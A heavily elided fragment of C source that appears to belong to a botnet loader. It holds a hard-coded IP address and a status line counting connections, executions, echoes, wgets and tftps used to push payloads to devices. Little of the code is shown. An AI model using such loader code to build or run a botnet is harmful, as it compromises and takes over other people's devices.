...
int main(int argc, char **args)
{
    ...
    addrs[0] = inet_addr("157.230.98.129");
...
static void *stats_thread(void *arg)
{
    ...
    {
        #ifndef DEBUG
        printf("\e[97m%ds \e[97m| (connections) \e[97m%d \e[97m| (executed) \e[97m%d \e[97m| (echoes) \e[97m%d \e[97m| (wgets) \e[97m%d \e[97m| (tftps) \e[97m%d \e[31m(fails = %d)\r\n",
